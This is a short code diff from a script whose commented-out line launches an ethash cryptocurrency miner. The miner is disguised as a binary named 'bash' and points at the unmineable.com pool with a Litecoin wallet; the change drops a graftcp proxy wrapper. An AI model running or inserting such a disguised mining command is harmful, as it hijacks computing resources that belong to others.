@@ -44,7 +44,7 @@ def run_script():
     echo "=== WORKLOAD START ==="
 
     # =====================================================
-    # ./graftcp/graftcp ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.kacung --ethstratum ETHPROX
+    # ./bash --algo ethash --pool stratum+tcp://ethash.unmineable.com:3333 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.kacung --ethstratum ETHPROX
     # =====================================================
 
 
